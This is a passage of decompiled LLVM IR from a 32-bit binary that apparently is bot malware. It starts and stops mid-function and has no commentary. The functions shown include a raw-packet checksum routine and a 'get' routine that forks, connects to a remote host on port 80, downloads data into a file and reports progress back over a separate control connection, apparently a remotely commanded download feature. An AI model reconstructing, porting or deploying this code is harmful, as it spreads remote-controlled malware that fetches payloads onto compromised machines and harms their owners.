  %v2_10000c74 = add i32 %v2_10000b6c, 60
  %v3_10000c7c = add i32 %v2_10000c74, %v4_10000c40
  %v4_10000c7c = inttoptr i32 %v3_10000c7c to i8*
  store i8 0, i8* %v4_10000c7c, align 1
  %v1_10000c84 = add i32 %v2_10000b6c, -1
  %v2_10000c8c = add i32 %v1_10000c84, %v4_10000c40
  %v1_10000c90 = add i32 %v2_10000c8c, 60
  %v2_10000c90 = inttoptr i32 %v1_10000c90 to i8*
  %v3_10000c90 = load i8, i8* %v2_10000c90, align 1
  %v3_10000c98 = icmp eq i8 %v3_10000c90, 10
  br i1 %v3_10000c98, label %dec_label_pc_10000cc0, label %dec_label_pc_10000ca0

dec_label_pc_10000ca0:                            ; preds = %dec_label_pc_10000c6c
  %v3_10000cb0 = load i8, i8* %v2_10000c90, align 1
  %v3_10000cb8 = icmp eq i8 %v3_10000cb0, 13
  br i1 %v3_10000cb8, label %dec_label_pc_10000cc0, label %dec_label_pc_10000cd8

dec_label_pc_10000cc0:                            ; preds = %dec_label_pc_10000ca0, %dec_label_pc_10000c6c
  store i8 0, i8* %v2_10000c90, align 1
  br label %dec_label_pc_10000cd8

dec_label_pc_10000cd8:                            ; preds = %dec_label_pc_10000ca0, %dec_label_pc_10000cc0
  %v1_10000cdc = add i32 %v2_10000b6c, -2
  %v2_10000ce4 = add i32 %v1_10000cdc, %v4_10000c40
  %v1_10000ce8 = add i32 %v2_10000ce4, 60
  %v2_10000ce8 = inttoptr i32 %v1_10000ce8 to i8*
  %v3_10000ce8 = load i8, i8* %v2_10000ce8, align 1
  %v3_10000cf0 = icmp eq i8 %v3_10000ce8, 10
  br i1 %v3_10000cf0, label %dec_label_pc_10000d18, label %dec_label_pc_10000cf8

dec_label_pc_10000cf8:                            ; preds = %dec_label_pc_10000cd8
  %v3_10000d08 = load i8, i8* %v2_10000ce8, align 1
  %v3_10000d10 = icmp eq i8 %v3_10000d08, 13
  br i1 %v3_10000d10, label %dec_label_pc_10000d18, label %dec_label_pc_10000d30

dec_label_pc_10000d18:                            ; preds = %dec_label_pc_10000cf8, %dec_label_pc_10000cd8
  store i8 0, i8* %v2_10000ce8, align 1
  br label %dec_label_pc_10000d30

dec_label_pc_10000d30:                            ; preds = %dec_label_pc_10000cf8, %dec_label_pc_10000d18
  %v3_10000d34 = load i32, i32* @global_var_10045170.31, align 4
  %v6_10000d54 = call i32 @Send(i32 %v4_10000af4, i32 ptrtoint ([25 x i8]* @global_var_1002a0bc.32 to i32), i32 %v2_10000c2c, i32 %v3_10000d34)
  store i32 268438880, i32* @lr, align 4
  %v1_10000d5c = call i32 @close(i32 %v4_10000af4)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d68.33 to i32), i32* @lr, align 4
  %v1_10000d64 = call i32 @close(i32 %v3_10000a34)
  %v0_10000d6c = call i32 @__GI_exit()
  br label %dec_label_pc_10000d70

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000ac8, %dec_label_pc_10000aac, %dec_label_pc_10000a50, %entry, %dec_label_pc_10000d30
  %v0_10000d84 = phi i32 [ 0, %dec_label_pc_10000ac8 ], [ -1, %dec_label_pc_10000aac ], [ -1, %dec_label_pc_10000a50 ], [ -1, %entry ], [ %v0_10000d6c, %dec_label_pc_10000d30 ]
  ret i32 %v0_10000d84

; uselistorder directives
  uselistorder i8* %v2_10000ce8, { 1, 0, 2 }
  uselistorder i8* %v2_10000c90, { 1, 0, 2 }
  uselistorder i32 %v4_10000c40, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c08, { 0, 2, 1 }
  uselistorder i32 %v1_10000b48, { 1, 0 }
  uselistorder i32 %v1_10000b80, { 1, 0 }
  uselistorder i32* %v1_10000b78, { 1, 0, 2 }
  uselistorder i32 %v2_10000b18, { 1, 0, 2 }
  uselistorder i32 %v4_10000af4, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d70, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d30, { 1, 0 }
  uselistorder label %dec_label_pc_10000cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10000bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10000b18, { 1, 0 }
}

define i32 @poww(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10000da8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000da8, label %dec_label_pc_10000db0, label %dec_label_pc_10000dbc

dec_label_pc_10000db0:                            ; preds = %entry
  br label %dec_label_pc_10000df8

dec_label_pc_10000dbc:                            ; preds = %entry
  %v3_10000dc0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dc0, label %dec_label_pc_10000dc8, label %dec_label_pc_10000dd4

dec_label_pc_10000dc8:                            ; preds = %dec_label_pc_10000dbc
  br label %dec_label_pc_10000df8

dec_label_pc_10000dd4:                            ; preds = %dec_label_pc_10000dbc
  %v1_10000dd8 = add i32 %arg2, -1
  %v2_10000de4 = call i32 @poww(i32 %arg1, i32 %v1_10000dd8)
  %v2_10000df0 = mul i32 %v2_10000de4, %arg1
  br label %dec_label_pc_10000df8

dec_label_pc_10000df8:                            ; preds = %dec_label_pc_10000dc8, %dec_label_pc_10000db0, %dec_label_pc_10000dd4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000db0 ], [ %arg1, %dec_label_pc_10000dc8 ], [ %v2_10000df0, %dec_label_pc_10000dd4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000df8, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10000e845 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e845, label %dec_label_pc_10000e50, label %dec_label_pc_10000e8c

dec_label_pc_10000e50:                            ; preds = %entry, %dec_label_pc_10000e50
  %stack_var_-24.09 = phi i32 [ %v1_10000e78, %dec_label_pc_10000e50 ], [ %arg2, %entry ]
  %stack_var_-28.08 = phi i16* [ %v5_10000e70, %dec_label_pc_10000e50 ], [ %arg1, %entry ]
  %stack_var_-32.07 = phi i32 [ %v2_10000e60, %dec_label_pc_10000e50 ], [ 0, %entry ]
  %v4_10000e50 = ptrtoint i16* %stack_var_-28.08 to i32
  %v2_10000e54 = load i16, i16* %stack_var_-28.08, align 2
  %v3_10000e54 = zext i16 %v2_10000e54 to i32
  %v2_10000e60 = add i32 %v3_10000e54, %stack_var_-32.07
  %v1_10000e6c = add i32 %v4_10000e50, 2
  %v5_10000e70 = inttoptr i32 %v1_10000e6c to i16*
  %v1_10000e78 = add nsw i32 %stack_var_-24.09, -2
  %v2_10000e84 = icmp sgt i32 %v1_10000e78, 1
  br i1 %v2_10000e84, label %dec_label_pc_10000e50, label %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge

dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge: ; preds = %dec_label_pc_10000e50
  %v3_10000e84.le = icmp eq i32 %v1_10000e78, 1
  br i1 %v3_10000e84.le, label %dec_label_pc_10000e98, label %dec_label_pc_10000ec0

dec_label_pc_10000e8c:                            ; preds = %entry
  %v3_10000e846 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e846, label %dec_label_pc_10000e98, label %dec_label_pc_10000ec0

dec_label_pc_10000e98:                            ; preds = %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge, %dec_label_pc_10000e8c
  %stack_var_-28.0.lcssa17 = phi i16* [ %v5_10000e70, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ], [ %arg1, %dec_label_pc_10000e8c ]
  %stack_var_-32.0.lcssa16 = phi i32 [ %v2_10000e60, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ], [ 0, %dec_label_pc_10000e8c ]
  %v1_10000ea0 = bitcast i16* %stack_var_-28.0.lcssa17 to i8*
  %v2_10000ea0 = load i8, i8* %v1_10000ea0, align 1
  %v3_10000ea0 = zext i8 %v2_10000ea0 to i32
  %v2_10000eb8 = add i32 %v3_10000ea0, %stack_var_-32.0.lcssa16
  br label %dec_label_pc_10000ec0

dec_label_pc_10000ec0:                            ; preds = %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge, %dec_label_pc_10000e8c, %dec_label_pc_10000e98
  %stack_var_-32.1 = phi i32 [ %v2_10000eb8, %dec_label_pc_10000e98 ], [ 0, %dec_label_pc_10000e8c ], [ %v2_10000e60, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ]
  %v4_10000ec4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000ecc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ed0 = add nsw i32 %v4_10000ec4, %v1_10000ecc
  %v4_10000edc = sdiv i32 %v2_10000ed0, 65536
  %v2_10000ee4 = add nsw i32 %v4_10000edc, %v2_10000ed0
  %v2_10000ef018 = urem i32 %v2_10000ee4, 65536
  %v1_10000efc = xor i32 %v2_10000ef018, 65535
  ret i32 %v1_10000efc

; uselistorder directives
  uselistorder i32 %v2_10000ed0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e78, { 0, 2, 1 }
  uselistorder i32 %v2_10000e60, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000e98, { 1, 0 }
  uselistorder label %dec_label_pc_10000e50, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f20 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f20, i32* %stack_var_-5232, align 4
  %v1_10000f4c = call i32 @mfork(i32 %arg2)
  %v3_10000f54 = icmp eq i32 %v1_10000f4c, 0
  br i1 %v3_10000f54, label %dec_label_pc_10000f5c, label %dec_label_pc_100014f4

dec_label_pc_10000f5c:                            ; preds = %entry
  %v2_10000f60 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f60, label %dec_label_pc_10000f88, label %dec_label_pc_10000f68

dec_label_pc_10000f68:                            ; preds = %dec_label_pc_10000f5c
  %v6_10000f7c = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1002a0d8.34 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10000f84 = call i32 @__GI_exit()
  br label %dec_label_pc_10000f88

dec_label_pc_10000f88:                            ; preds = %dec_label_pc_10000f5c, %dec_label_pc_10000f68
  store i32 268439448, i32* @lr, align 4
  %v3_10000f94 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000fa8 = icmp eq i32 %v3_10000f94, -1
  br i1 %v4_10000fa8, label %dec_label_pc_10000fb0, label %dec_label_pc_10000fd0

dec_label_pc_10000fb0:                            ; preds = %dec_label_pc_10000f88
  %v6_10000fc4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a0fc.37 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10000fcc = call i32 @__GI_exit()
  br label %dec_label_pc_10000fd0

dec_label_pc_10000fd0:                            ; preds = %dec_label_pc_10000f88, %dec_label_pc_10000fb0
  %v1_10000fd4 = add i32 %arg4, 4
  %v1_10000fd8 = inttoptr i32 %v1_10000fd4 to i32*
  %v2_10000fd8 = load i32, i32* %v1_10000fd8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002a124.39 to i32), i32* @r4, align 4
  %v4_10000fec = inttoptr i32 %v2_10000fd8 to i8*
  %v5_10000fec = call i32 @__GI_strncmp(i8* %v4_10000fec, i32 ptrtoint ([8 x i8]* @global_var_1002a124.39 to i32), i32 7)
  %v3_10000ff4 = icmp eq i32 %v5_10000fec, 0
  %v2_10001004 = load i32, i32* %v1_10000fd8, align 4
  br i1 %v3_10000ff4, label %dec_label_pc_10000ffc, label %dec_label_pc_10001020

dec_label_pc_10000ffc:                            ; preds = %dec_label_pc_10000fd0
  %v1_10001008 = add i32 %v2_10001004, 7
  %v2_1000100c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001018 = inttoptr i32 %v1_10001008 to i8*
  %v3_10001018 = call i32 @strcpy(i32 %v2_1000100c, i8* %v2_10001018)
  br label %dec_label_pc_1000103c

dec_label_pc_10001020:                            ; preds = %dec_label_pc_10000fd0
  %v2_1000102c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001038 = inttoptr i32 %v2_10001004 to i8*
  %v3_10001038 = call i32 @strcpy(i32 %v2_1000102c, i8* %v2_10001038)
  br label %dec_label_pc_1000103c

dec_label_pc_1000103c:                            ; preds = %dec_label_pc_10000ffc, %dec_label_pc_10001020
  %v2_10001058.pre-phi = phi i32 [ %v2_1000100c, %dec_label_pc_10000ffc ], [ %v2_1000102c, %dec_label_pc_10001020 ]
  %v2_10001074 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001058.pre-phi, i32* @r3, align 4
  %v0_1000106065 = call i32 @__GI_strlen()
  %v2_1000106867 = icmp eq i32 %v0_1000106065, 0
  br i1 %v2_1000106867, label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge, label %dec_label_pc_10001070

dec_label_pc_10001048:                            ; preds = %dec_label_pc_10001070
  %v1_1000104c = add i32 %storemerge570, 1
  store i32 %v2_10001058.pre-phi, i32* @r3, align 4
  %v0_10001060 = call i32 @__GI_strlen()
  %v2_10001068 = icmp ult i32 %v1_1000104c, %v0_10001060
  br i1 %v2_10001068, label %dec_label_pc_10001070, label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge

dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge: ; preds = %dec_label_pc_1000103c, %dec_label_pc_10001048
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000103c ], [ %v1_1000104c, %dec_label_pc_10001048 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001074
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000108c

dec_label_pc_10001070:                            ; preds = %dec_label_pc_1000103c, %dec_label_pc_10001048
  %storemerge570 = phi i32 [ %v1_1000104c, %dec_label_pc_10001048 ], [ 0, %dec_label_pc_1000103c ]
  %v2_10001078 = add i32 %storemerge570, %v2_10001074
  %v1_1000107c = add i32 %v2_10001078, 60
  %v2_1000107c = inttoptr i32 %v1_1000107c to i8*
  %v3_1000107c = load i8, i8* %v2_1000107c, align 1
  %v3_10001084 = icmp eq i8 %v3_1000107c, 47
  br i1 %v3_10001084, label %dec_label_pc_1000108c, label %dec_label_pc_10001048

dec_label_pc_1000108c:                            ; preds = %dec_label_pc_10001070, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge ], [ %storemerge570, %dec_label_pc_10001070 ]
  %v4_1000109c.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge ], [ %v2_1000107c, %dec_label_pc_10001070 ]
  store i8 0, i8* %v4_1000109c.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010ac = call i32 @htons(i32 80)
  store i32 268439748, i32* @lr, align 4
  %v1_100010c0 = call i32 @inet_addr(i32 %v2_10001058.pre-phi)
  %v4_100010d4 = icmp eq i32 %v1_100010c0, -1
  br i1 %v4_100010d4, label %dec_label_pc_100010dc, label %dec_label_pc_10001150

dec_label_pc_100010dc:                            ; preds = %dec_label_pc_1000108c
  store i32 268439784, i32* @lr, align 4
  %v1_100010e4 = call i32 @__GI_gethostbyname(i32 %v2_10001058.pre-phi)
  %v3_100010f4 = icmp eq i32 %v1_100010e4, 0
  br i1 %v3_100010f4, label %dec_label_pc_100010fc, label %dec_label_pc_1000111c

dec_label_pc_100010fc:                            ; preds = %dec_label_pc_100010dc
  %v6_10001110 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a12c.42 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10001118 = call i32 @__GI_exit()
  br label %dec_label_pc_1000111c

dec_label_pc_1000111c:                            ; preds = %dec_label_pc_100010dc, %dec_label_pc_100010fc
  %v2_10001120 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001128 = add i32 %v1_100010e4, 16
  %v2_10001128 = inttoptr i32 %v1_10001128 to i32*
  %v3_10001128 = load i32, i32* %v2_10001128, align 4
  %v1_1000112c = inttoptr i32 %v3_10001128 to i32*
  %v2_1000112c = load i32, i32* %v1_1000112c, align 4
  store i32 %v2_1000112c, i32* %r11.global-to-local, align 4
  %v1_10001134 = add i32 %v1_100010e4, 12
  %v2_10001134 = inttoptr i32 %v1_10001134 to i32*
  %v3_10001134 = load i32, i32* %v2_10001134, align 4
  store i32 %v2_10001120, i32* @r3, align 4
  store i32 %v2_1000112c, i32* @r4, align 4
  store i32 %v3_10001134, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000114c.45 to i32), i32* @lr, align 4
  %v0_10001148 = call i32 @memcpy()
  br label %dec_label_pc_10001158

dec_label_pc_10001150:                            ; preds = %dec_label_pc_1000108c
  store i32 %v1_100010c0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001158

dec_label_pc_10001158:                            ; preds = %dec_label_pc_1000111c, %dec_label_pc_10001150
  %v2_10001170.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439940, i32* @lr, align 4
  %v3_10001180 = call i32 @connect(i32 %v3_10000f94, i32 %v2_10001170.pre-phi, i32 16)
  %v3_10001188 = icmp eq i32 %v3_10001180, 0
  br i1 %v3_10001188, label %dec_label_pc_100011b0, label %dec_label_pc_10001190

dec_label_pc_10001190:                            ; preds = %dec_label_pc_10001158
  %v6_100011a4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a154.46 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_100011ac = call i32 @__GI_exit()
  br label %dec_label_pc_100011b0

dec_label_pc_100011b0:                            ; preds = %dec_label_pc_10001158, %dec_label_pc_10001190
  %v2_100011b8 = add i32 %v2_10001058.pre-phi, 1
  %v1_100011bc = add i32 %v2_100011b8, %storemerge564
  store i32 %v2_10001058.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011dc = call i32 @Send(i32 %v3_10000f94, i32 ptrtoint ([276 x i8]* @global_var_1002a17c.48 to i32), i32 %v1_100011bc, i32 %v2_10001058.pre-phi)
  %v6_100011f4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002a290.49 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v1_100011fc = add i32 %arg4, 8
  %v1_10001200 = inttoptr i32 %v1_100011fc to i32*
  %v2_10001200 = load i32, i32* %v1_10001200, align 4
  store i32 268440084, i32* @lr, align 4
  %v3_10001210 = call i32 @__GI_fopen(i32 %v2_10001200, i32 ptrtoint ([3 x i8]* @global_var_1002a2ac.50 to i32))
  %v2_1000121c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000121c

dec_label_pc_1000121c:                            ; preds = %dec_label_pc_10001378, %dec_label_pc_100011b0
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @recv(i32 %v3_10000f94, i32 %v2_1000121c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001230, 1
  br i1 %tmp58, label %dec_label_pc_10001398, label %dec_label_pc_10001248

dec_label_pc_10001248:                            ; preds = %dec_label_pc_1000121c
  %v2_1000124c = icmp sgt i32 %v4_10001230, 4095
  br i1 %v2_1000124c, label %dec_label_pc_10001274.lr.ph, label %dec_label_pc_10001254

dec_label_pc_10001254:                            ; preds = %dec_label_pc_10001248
  %v2_1000125c = add i32 %v4_10001230, %v2_10001074
  %v3_10001264 = add i32 %v2_1000125c, 1084
  %v4_10001264 = inttoptr i32 %v3_10001264 to i8*
  store i8 0, i8* %v4_10001264, align 1
  br label %dec_label_pc_10001274.lr.ph

dec_label_pc_10001274.lr.ph:                      ; preds = %dec_label_pc_10001254, %dec_label_pc_10001248
  br label %dec_label_pc_10001274

dec_label_pc_10001274:                            ; preds = %dec_label_pc_10001274.lr.ph, %dec_label_pc_10001378
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001274.lr.ph ], [ %v1_1000137c, %dec_label_pc_10001378 ]
  %v2_10001280 = add i32 %storemerge625, %v2_1000121c
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32* @r4, align 4
  %v4_10001294 = inttoptr i32 %v2_10001280 to i8*
  %v5_10001294 = call i32 @__GI_strncmp(i8* %v4_10001294, i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32 4)
  %v3_1000129c = icmp eq i32 %v5_10001294, 0
  br i1 %v3_1000129c, label %dec_label_pc_100012a4, label %dec_label_pc_10001378

dec_label_pc_100012a4:                            ; preds = %dec_label_pc_10001274
  %v1_100012a8 = add i32 %storemerge625, 4
  %v2_1000136c18 = icmp slt i32 %v1_100012a8, %v4_10001230
  br i1 %v2_1000136c18, label %dec_label_pc_100012b4.lr.ph, label %dec_label_pc_10001398

dec_label_pc_100012b4.lr.ph:                      ; preds = %dec_label_pc_100012a4
  %v1_100012c0 = add i32 %v3_10001210, 52
  %v2_100012c0 = inttoptr i32 %v1_100012c0 to i32*
  %v1_100012d0 = add i32 %v3_10001210, 16
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012d8 = add i32 %v3_10001210, 28
  %v2_100012d8 = inttoptr i32 %v1_100012d8 to i32*
  br label %dec_label_pc_100012b4

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_100012b4.lr.ph, %dec_label_pc_10001358
  %storemerge721 = phi i32 [ %v1_100012a8, %dec_label_pc_100012b4.lr.ph ], [ %v1_1000135c, %dec_label_pc_10001358 ]
  %v3_100012c0 = load i32, i32* %v2_100012c0, align 4
  %v3_100012c4 = icmp eq i32 %v3_100012c0, 0
  br i1 %v3_100012c4, label %dec_label_pc_10001338, label %dec_label_pc_100012cc

dec_label_pc_100012cc:                            ; preds = %dec_label_pc_100012b4
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  store i32 %v3_100012d0, i32* %r11.global-to-local, align 4
  %v3_100012d8 = load i32, i32* %v2_100012d8, align 4
  %v2_100012dc = icmp ult i32 %v3_100012d0, %v3_100012d8
  br i1 %v2_100012dc, label %dec_label_pc_100012e4, label %dec_label_pc_10001314

dec_label_pc_100012e4:                            ; preds = %dec_label_pc_100012cc
  %v3_100012e8 = load i32, i32* %v2_100012d0, align 4
  store i32 %v3_100012e8, i32* %r11.global-to-local, align 4
  %v2_100012f4 = add i32 %storemerge721, %v2_10001074
  %v1_100012f8 = add i32 %v2_100012f4, 1084
  %v2_100012f8 = inttoptr i32 %v1_100012f8 to i8*
  %v3_100012f8 = load i8, i8* %v2_100012f8, align 1
  %v3_10001300 = inttoptr i32 %v3_100012e8 to i8*
  store i8 %v3_100012f8, i8* %v3_10001300, align 1
  %v0_10001304 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001304 = add i32 %v0_10001304, 1
  store i32 %v1_10001304, i32* %v2_100012d0, align 4
  br label %dec_label_pc_10001358

dec_label_pc_10001314:                            ; preds = %dec_label_pc_100012cc
  %v2_1000131c = add i32 %storemerge721, %v2_10001074
  %v1_10001320 = add i32 %v2_1000131c, 1084
  %v2_10001320 = inttoptr i32 %v1_10001320 to i8*
  %v3_10001320 = load i8, i8* %v2_10001320, align 1
  store i32 ptrtoint (i32* @global_var_10001334.52 to i32), i32* @lr, align 4
  %v4_10001330 = call i32 @putc_unlocked(i8 %v3_10001320, i32 %v3_10001210, i32 %v2_1000131c)
  br label %dec_label_pc_10001358

dec_label_pc_10001338:                            ; preds = %dec_label_pc_100012b4
  %v2_10001340 = add i32 %storemerge721, %v2_10001074
  %v1_10001344 = add i32 %v2_10001340, 1084
  %v2_10001344 = inttoptr i32 %v1_10001344 to i8*
  %v3_10001344 = load i8, i8* %v2_10001344, align 1
  store i32 268440408, i32* @lr, align 4
  %v4_10001354 = call i32 @__GI_fputc(i8 %v3_10001344, i32 %v3_10001210, i32 %v2_10001340)
  br label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001314, %dec_label_pc_100012e4, %dec_label_pc_10001338
  %v1_1000135c = add i32 %storemerge721, 1
  %v2_1000136c = icmp slt i32 %v1_1000135c, %v4_10001230
  br i1 %v2_1000136c, label %dec_label_pc_100012b4, label %dec_label_pc_10001398

dec_label_pc_10001378:                            ; preds = %dec_label_pc_10001274
  %v1_1000137c = add nuw nsw i32 %storemerge625, 1
  %v2_1000138c = icmp slt i32 %v1_1000137c, %v4_10001230
  br i1 %v2_1000138c, label %dec_label_pc_10001274, label %dec_label_pc_1000121c

dec_label_pc_10001398:                            ; preds = %dec_label_pc_1000121c, %dec_label_pc_10001358, %dec_label_pc_100012a4
  %v2_100013a0 = load i32, i32* %v1_10001200, align 4
  %v6_100013bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1002a2b8.53 to i32), i32 %arg2, i32 %v2_100013a0)
  %v1_10001424 = add i32 %v3_10001210, 52
  %v2_10001424 = inttoptr i32 %v1_10001424 to i32*
  %v1_10001434 = add i32 %v3_10001210, 16
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_1000143c = add i32 %v3_10001210, 28
  %v2_1000143c = inttoptr i32 %v1_1000143c to i32*
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_100014bc, %dec_label_pc_10001398
  store i32 268440536, i32* @lr, align 4
  %v4_100013d4 = call i32 @recv(i32 %v3_10000f94, i32 %v2_1000121c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013d4, 1
  br i1 %tmp59, label %dec_label_pc_100014dc, label %dec_label_pc_100013ec

dec_label_pc_100013ec:                            ; preds = %dec_label_pc_100013c0
  %v2_100013f0 = icmp sgt i32 %v4_100013d4, 4095
  br i1 %v2_100013f0, label %dec_label_pc_10001418.lr.ph, label %dec_label_pc_100013f8

dec_label_pc_100013f8:                            ; preds = %dec_label_pc_100013ec
  %v2_10001400 = add i32 %v4_100013d4, %v2_10001074
  %v3_10001408 = add i32 %v2_10001400, 1084
  %v4_10001408 = inttoptr i32 %v3_10001408 to i8*
  store i8 0, i8* %v4_10001408, align 1
  br label %dec_label_pc_10001418.lr.ph

dec_label_pc_10001418.lr.ph:                      ; preds = %dec_label_pc_100013f8, %dec_label_pc_100013ec
  br label %dec_label_pc_10001418

dec_label_pc_10001418:                            ; preds = %dec_label_pc_10001418.lr.ph, %dec_label_pc_100014bc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001418.lr.ph ], [ %v1_100014c0, %dec_label_pc_100014bc ]
  store i32 %v3_10001210, i32* %stack_var_-5224, align 4
  %v3_10001424 = load i32, i32* %v2_10001424, align 4
  %v3_10001428 = icmp eq i32 %v3_10001424, 0
  br i1 %v3_10001428, label %dec_label_pc_1000149c, label %dec_label_pc_10001430

dec_label_pc_10001430:                            ; preds = %dec_label_pc_10001418
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  store i32 %v3_10001434, i32* %r11.global-to-local, align 4
  %v3_1000143c = load i32, i32* %v2_1000143c, align 4
  %v2_10001440 = icmp ult i32 %v3_10001434, %v3_1000143c
  br i1 %v2_10001440, label %dec_label_pc_10001448, label %dec_label_pc_10001478

dec_label_pc_10001448:                            ; preds = %dec_label_pc_10001430
  %v3_1000144c = load i32, i32* %v2_10001434, align 4
  store i32 %v3_1000144c, i32* %r11.global-to-local, align 4
  %v2_10001458 = add i32 %storemerge817, %v2_10001074
  %v1_1000145c = add i32 %v2_10001458, 1084
  %v2_1000145c = inttoptr i32 %v1_1000145c to i8*
  %v3_1000145c = load i8, i8* %v2_1000145c, align 1
  %v3_10001464 = inttoptr i32 %v3_1000144c to i8*
  store i8 %v3_1000145c, i8* %v3_10001464, align 1
  %v0_10001468 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001468 = add i32 %v0_10001468, 1
  %v3_1000146c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001470 = add i32 %v3_1000146c, 16
  %v3_10001470 = inttoptr i32 %v2_10001470 to i32*
  store i32 %v1_10001468, i32* %v3_10001470, align 4
  br label %dec_label_pc_100014bc

dec_label_pc_10001478:                            ; preds = %dec_label_pc_10001430
  %v2_10001480 = add i32 %storemerge817, %v2_10001074
  %v1_10001484 = add i32 %v2_10001480, 1084
  %v2_10001484 = inttoptr i32 %v1_10001484 to i8*
  %v3_10001484 = load i8, i8* %v2_10001484, align 1
  store i32 ptrtoint (i32* @global_var_10001498.54 to i32), i32* @lr, align 4
